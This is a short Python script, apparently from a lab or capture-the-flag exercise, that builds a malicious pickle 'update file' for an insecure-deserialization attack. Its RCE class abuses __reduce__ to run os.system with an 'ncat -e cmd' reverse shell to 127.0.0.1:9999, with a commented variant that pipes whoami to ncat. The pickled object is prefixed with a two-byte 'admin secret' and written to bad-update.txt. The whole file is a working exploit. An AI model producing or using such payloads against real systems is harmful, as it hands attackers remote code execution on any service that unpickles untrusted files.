import pickle
import os
import requests

ADMIN_SECRET = b"\xff\xfe"


class RCE:
  # Malicious method
  def __reduce__(self):
    # Reverse shell
    cmd = "ncat -e cmd 127.0.0.1 9999"
    #cmd = "whoami | ncat 127.0.0.1 9999"
    return (os.system, (cmd, ))


payload = ADMIN_SECRET + pickle.dumps(RCE())

# Save to file
print("Making malicious update file")
with open("bad-update.txt", "wb") as f:
  f.write(payload)
